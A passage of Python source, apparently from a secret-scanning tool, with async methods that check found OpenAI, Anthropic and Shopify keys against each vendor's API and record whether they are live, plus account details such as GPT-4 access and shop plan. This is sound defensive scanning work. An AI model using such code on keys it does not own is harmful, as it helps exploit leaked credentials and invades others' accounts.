                    result.account_info["models_count"] = str(len(models))
                    gpt4 = any("gpt-4" in m.get("id", "") for m in models)
                    result.account_info["has_gpt4"] = str(gpt4)
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                elif resp.status == 429:
                    result.is_live = True
                    result.confidence = 0.9
                    result.account_info["note"] = "Rate limited but key is valid"
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_anthropic(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Anthropic API key via models endpoint."""
        async with aiohttp.ClientSession() as session:
            headers = {
                "x-api-key": result.key_full,
                "anthropic-version": "2023-06-01",
            }
            async with session.get(
                "https://api.anthropic.com/v1/models",
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    result.is_live = True
                    result.confidence = 1.0
                    data = await resp.json()
                    models = data.get("data", [])
                    result.account_info["models_count"] = str(len(models))
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                elif resp.status == 429:
                    result.is_live = True
                    result.confidence = 0.9
                    result.account_info["note"] = "Rate limited but key is valid"
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_shopify(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Shopify access token — needs store domain context."""
        # Shopify tokens need the store domain; we can try a generic check
        # The token format is shpat_ — if we find it in context with a store URL, use that
        store = extra.get("domain", extra.get("store", ""))
        if not store:
            result.error = "No store domain in context"
            return
        if not store.endswith(".myshopify.com"):
            store = f"{store}.myshopify.com"
        async with aiohttp.ClientSession() as session:
            headers = {"X-Shopify-Access-Token": result.key_full}
            async with session.get(
                f"https://{store}/admin/api/2024-01/shop.json",
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    shop = data.get("shop", {})
                    result.is_live = True
                    result.confidence = 1.0
                    result.account_info["shop_name"] = shop.get("name", "")
                    result.account_info["plan"] = shop.get("plan_name", "")
                    result.account_info["domain"] = shop.get("domain", "")
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"
